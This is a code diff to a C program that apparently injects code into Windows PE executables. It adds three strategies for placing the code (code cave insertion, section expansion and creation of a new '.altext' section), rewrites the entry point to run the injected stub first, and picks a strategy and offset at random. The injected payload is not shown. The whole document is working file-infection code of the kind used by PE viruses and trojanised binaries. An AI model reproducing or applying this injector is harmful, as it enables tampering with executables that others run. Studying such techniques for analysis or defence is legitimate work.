@@ -1,4 +1,5 @@
 #include "pe_parser.h"
+#include <time.h>
 
 int GetInfoFromNTHeader(void* optHeader, ULONGLONG* imageBase, DWORD** entryPoint)
 {
@@ -75,8 +76,84 @@ DWORD AlignAddress(DWORD original, DWORD alignment)
     return (original / alignment + 1) * alignment;
 }
 
+void InsertEntryPointToCavern(char* buffer, DWORD bufferSize, char* originalFilename, INJECTOR_INFO* info)
+{
+    DWORD offset = rand() % info->size;
+    ENTRY_POINT_CODE code = GetEntryPointCodeSmall(info->execSection->VirtualAddress + info->execSection->Misc.VirtualSize + offset, *(info->entryPoint));
+    *(info->entryPoint) = info->execSection->VirtualAddress + info->execSection->Misc.VirtualSize + offset;
+    memcpy(buffer + info->execSection->PointerToRawData + info->execSection->Misc.VirtualSize + offset, code.code, code.sizeOfCode);
+    info->execSection->Misc.VirtualSize += code.sizeOfCode + offset;
+    WriteNewFile(originalFilename, buffer, bufferSize);
+    free(code.code);
+}
+
+void ExpandSection(char* buffer, DWORD bufferSize, char* originalFilename, INJECTOR_INFO* info)
+{
+    DWORD sizeRaw = info->execSection->SizeOfRawData;
+    DWORD rawAlign = info->ntHeader->OptionalHeader.FileAlignment;
+    IMAGE_FILE_HEADER* fileHeader = &info->ntHeader->FileHeader;
+    WORD* nsec = &fileHeader->NumberOfSections;
+    DWORD offset = rand() % info->size;
+    ENTRY_POINT_CODE code = GetEntryPointCodeSmall(info->execSection->VirtualAddress + sizeRaw + offset, *(info->entryPoint));
+    if (!CheckValidityOfEntryPointCode(&code)) {
+        printf(CODE_NOT_GENERATED);
+        return;
+    }
+    unsigned int newbufSize = bufferSize + AlignAddress(offset + code.sizeOfCode, rawAlign);
+    *(info->entryPoint) = info->execSection->VirtualAddress + sizeRaw + offset;
+    FixSectionRawData(info->ntHeader, *nsec, info->execSection->PointerToRawData + info->execSection->SizeOfRawData, AlignAddress(offset + code.sizeOfCode, rawAlign));
+    info->execSection->SizeOfRawData += AlignAddress(offset + code.sizeOfCode, rawAlign);
+    char* newbuf = (char*)malloc(newbufSize);
+    memcpy(newbuf, buffer, info->execSection->PointerToRawData + sizeRaw);
+    memset(newbuf + info->execSection->PointerToRawData + sizeRaw, 0, offset);
+    memcpy(newbuf + info->execSection->PointerToRawData + sizeRaw + offset, code.code, code.sizeOfCode);
+    memset(newbuf + info->execSection->PointerToRawData + sizeRaw + offset + code.sizeOfCode, 0, AlignAddress(offset, rawAlign) - code.sizeOfCode - offset);
+    memcpy(newbuf + info->execSection->PointerToRawData + sizeRaw + AlignAddress(offset, rawAlign), buffer + info->execSection->PointerToRawData + sizeRaw, bufferSize - (info->execSection->PointerToRawData + sizeRaw));
+    WriteNewFile(originalFilename, newbuf, newbufSize);
+    free(newbuf);
+    free(code.code);
+}
+
+void CreateNewSection(char* buffer, DWORD bufferSize, char* originalFilename, INJECTOR_INFO* info)
+{
+    DWORD sectAlign = info->ntHeader->OptionalHeader.SectionAlignment;
+    DWORD rawAlign = info->ntHeader->OptionalHeader.FileAlignment;
+    IMAGE_FILE_HEADER* fileHeader = &info->ntHeader->FileHeader;
+    WORD* nsec = &fileHeader->NumberOfSections;
+    memcpy(info->addSection->Name, ".altext\0", 8);
+    info->addSection->VirtualAddress = (info->sizeOfLastSection % sectAlign == 0 ? info->sizeOfLastSection : AlignAddress(info->sizeOfLastSection, sectAlign)) + info->lastVirtualAddress;
+    ENTRY_POINT_CODE code = GetEntryPointCodeSmall(info->addSection->VirtualAddress, *info->entryPoint);
+    if (!CheckValidityOfEntryPointCode(&code)) {
+        printf(CODE_NOT_GENERATED);
+        return;
+    }
+    info->addSection->Misc.VirtualSize = code.sizeOfCode;
+    info->addSection->SizeOfRawData = AlignAddress(code.sizeOfCode, rawAlign);
+    info->addSection->PointerToRawData = bufferSize;
+    info->addSection->PointerToRelocations = 0;
+    info->addSection->PointerToLinenumbers = 0;
+    info->addSection->NumberOfRelocations = 0;
+    info->addSection->NumberOfLinenumbers = 0;
+    info->addSection->Characteristics = info->execSection->Characteristics;
+    (*nsec)++;
+    *info->entryPoint = info->addSection->VirtualAddress;
+    info->ntHeader->OptionalHeader.SizeOfHeaders += sizeof(*info->execSection);
+    info->ntHeader->OptionalHeader.SizeOfImage += AlignAddress(code.sizeOfCode, sectAlign);
+    info->ntHeader->OptionalHeader.SizeOfInitializedData += AlignAddress(code.sizeOfCode, rawAlign);
+    info->ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
+    info->ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
+    char* newbuf = (char*)malloc(bufferSize + info->addSection->SizeOfRawData);
+    memcpy(newbuf, buffer, bufferSize);
+    memcpy(newbuf + bufferSize, code.code, code.sizeOfCode);
+    memset(newbuf + bufferSize + code.sizeOfCode, 0, info->addSection->SizeOfRawData - code.sizeOfCode);
+    WriteNewFile(originalFilename, newbuf, bufferSize + info->addSection->SizeOfRawData);
+    free(newbuf);
+    free(code.code);
+}
+
 void ChangeEntryPoint( char* buffer, DWORD bufferSize, char* originalFilename )
 {
+    srand(time(NULL));
     IMAGE_NT_HEADERS* ntHeader;
     if (!GetNTHeader(buffer, bufferSize, &ntHeader))
         return;
@@ -92,91 +169,71 @@ void ChangeEntryPoint( char* buffer, DWORD bufferSize, char* originalFilename )
         printf(WRONG_NUMBER_OF_SECTIONS);
         return;
     }
-    IMAGE_SECTION_HEADER* j = IMAGE_FIRST_SECTION(ntHeader);
-    IMAGE_SECTION_HEADER* section = NULL;
-    WORD i;
+    IMAGE_SECTION_HEADER* sectIter = IMAGE_FIRST_SECTION(ntHeader);
+    IMAGE_SECTION_HEADER* execSection = NULL;
     DWORD firstFileAddress = MAXDWORD;
     DWORD lastVirtualAddress = 0;
     DWORD sizeOfLastSection = 0;
-    for (i = 0; i < *nsec; i++, j++) {
-        DWORD virtAddress = j->VirtualAddress;
-        DWORD size = j->Misc.VirtualSize;
+    for (WORD i = 0; i < *nsec; i++, sectIter++) {
+        DWORD virtAddress = sectIter->VirtualAddress;
+        DWORD size = sectIter->Misc.VirtualSize;
         if (virtAddress <= *entryPoint && *entryPoint < virtAddress + size) {
-            section = j;
+            execSection = sectIter;
         }
-        if (j->PointerToRawData < firstFileAddress)
-            firstFileAddress = j->PointerToRawData;
-        if (j->VirtualAddress > lastVirtualAddress) {
-            lastVirtualAddress = j->VirtualAddress;
-            sizeOfLastSection = j->Misc.VirtualSize;
+        if (sectIter->PointerToRawData < firstFileAddress)
+            firstFileAddress = sectIter->PointerToRawData;
+        if (sectIter->VirtualAddress > lastVirtualAddress) {
+            lastVirtualAddress = sectIter->VirtualAddress;
+            sizeOfLastSection = sectIter->Misc.VirtualSize;
         }
     }
-    if (section == NULL) {
+    if (execSection == NULL) {
         printf(SECTION_NOT_FOUND);
         return;
     }
-    DWORD sizeRaw = section->SizeOfRawData;
-    DWORD virtSize = section->Misc.VirtualSize;
+    DWORD sizeRaw = execSection->SizeOfRawData;
+    DWORD virtSize = execSection->Misc.VirtualSize;
     DWORD sectAlign = ntHeader->OptionalHeader.SectionAlignment;
-    DWORD rawAlign = ntHeader->OptionalHeader.FileAlignment;
-    ENTRY_POINT_CODE code = GetEntryPointCodeSmall(section->VirtualAddress + virtSize, *entryPoint);
+    ENTRY_POINT_CODE code = GetEntryPointCodeSmall(execSection->VirtualAddress + virtSize, *entryPoint);
     if (!CheckValidityOfEntryPointCode(&code)) {
         printf(CODE_NOT_GENERATED);
         return;
     }
-    // strategy1
-    if (sizeRaw >= virtSize + code.sizeOfCode) {
-        *entryPoint = section->VirtualAddress + virtSize;
-        section->Misc.VirtualSize += code.sizeOfCode;
-        memcpy(buffer + section->PointerToRawData + virtSize, code.code, code.sizeOfCode);
-        WriteNewFile(originalFilename, buffer, bufferSize);
+    DWORD codeSize = code.sizeOfCode;
+    free(code.code);
+    INJECTOR_INFO info;
+    info.ntHeader = ntHeader;
+    info.execSection = execSection;
+    info.entryPoint = entryPoint;
+    info.lastVirtualAddress = lastVirtualAddress;
+    info.sizeOfLastSection = sizeOfLastSection;
+    info.addSection = sectIter;
+    void(*strategies[])(char* buffer, DWORD bufferSize, char* originalFilename, INJECTOR_INFO* info) = { InsertEntryPointToCavern, ExpandSection, CreateNewSection };
+    bool application[] = { sizeRaw >= virtSize + codeSize, virtSize % sectAlign + code.sizeOfCode <= sectAlign, firstFileAddress >= ((char*)sectIter - buffer) + sizeof(IMAGE_SECTION_HEADER) };
+    DWORD sizes[] = { sizeRaw - virtSize - codeSize , sectAlign - virtSize % sectAlign - codeSize , 0 };
+    const char* names[] = { "INSERT", "EXPAND", "NEW SECTION" };
+    int total = 0;
+    for (int i = 0; i < sizeof(application); i++)
+        total += application[i] ? 1 : 0;
+    if (total == 0) {
+        printf(NO_STRATEGY_FOUND);
         return;
     }
-    //strategy2
-    if (virtSize % sectAlign + code.sizeOfCode <= sectAlign) {
-        unsigned int newbufSize = bufferSize + AlignAddress(code.sizeOfCode, rawAlign);
-        *entryPoint = section->VirtualAddress + sizeRaw;
-        FixSectionRawData(ntHeader, *nsec, section->PointerToRawData + section->SizeOfRawData, AlignAddress(code.sizeOfCode, rawAlign));
-        section->SizeOfRawData += AlignAddress(code.sizeOfCode, rawAlign);
-        char* newbuf = (char*)malloc(newbufSize);
-        memcpy(newbuf, buffer, section->PointerToRawData + sizeRaw);
-        memcpy(newbuf + section->PointerToRawData + sizeRaw, code.code, code.sizeOfCode);
-        memset(newbuf + section->PointerToRawData + sizeRaw + code.sizeOfCode, 0, rawAlign - code.sizeOfCode);
-        memcpy(newbuf + section->PointerToRawData + sizeRaw + AlignAddress(code.sizeOfCode, rawAlign), buffer + section->PointerToRawData + sizeRaw, bufferSize - (section->PointerToRawData + sizeRaw));
-        WriteNewFile(originalFilename, newbuf, newbufSize);
-        free(newbuf);
-        return;
-    }
-    //strategy3
-    if (firstFileAddress >= ((char*)j - buffer) + sizeof(IMAGE_SECTION_HEADER)) {
-        memcpy(j->Name, ".altext\0", 8);
-        j->VirtualAddress = (sizeOfLastSection % sectAlign == 0 ? sizeOfLastSection : AlignAddress(sizeOfLastSection, sectAlign)) + lastVirtualAddress;
-        ENTRY_POINT_CODE code = GetEntryPointCodeSmall(j->VirtualAddress, *entryPoint);
-        if (!CheckValidityOfEntryPointCode(&code)) {
-            printf(CODE_NOT_GENERATED);
-            return;
+    int target = rand() % total;
+    int cur = 0;
+    for (int i = 0; i < sizeof(application)/sizeof(*application); i++) {
+        if (application[i]) {
+            if (cur == target) {
+                info.size = sizes[i];
+                printf("Applied strategy %s\n", names[i]);
+                strategies[i](buffer, bufferSize, originalFilename, &info);
+                return;
+            }
+            else {
+                cur++;
+            }
         }
-        j->Misc.VirtualSize = code.sizeOfCode;
-        j->SizeOfRawData = AlignAddress(code.sizeOfCode, rawAlign);
-        j->PointerToRawData = bufferSize;
-        j->PointerToRelocations = 0;
-        j->PointerToLinenumbers = 0;
-        j->NumberOfRelocations = 0;
-        j->NumberOfLinenumbers = 0;
-        j->Characteristics = section->Characteristics;
-        (*nsec)++;
-        *entryPoint = j->VirtualAddress;
-        ntHeader->OptionalHeader.SizeOfHeaders += sizeof(section);
-        ntHeader->OptionalHeader.SizeOfImage += AlignAddress(code.sizeOfCode, sectAlign);
-        char* newbuf = (char*)malloc(bufferSize + j->SizeOfRawData);
-        memcpy(newbuf, buffer, bufferSize);
-        memcpy(newbuf + bufferSize, code.code, code.sizeOfCode);
-        memset(newbuf + bufferSize + code.sizeOfCode, 0, j->SizeOfRawData - code.sizeOfCode);
-        WriteNewFile(originalFilename, newbuf, bufferSize + j->SizeOfRawData);
-        free(newbuf);
-        return;
     }
-    printf(NO_STRATEGY_FOUND);
 }
 
 ENTRY_POINT_CODE GetEntryPointCodeSmall( DWORD rvaToNewEntryPoint, DWORD rvaToOriginalEntryPoint )
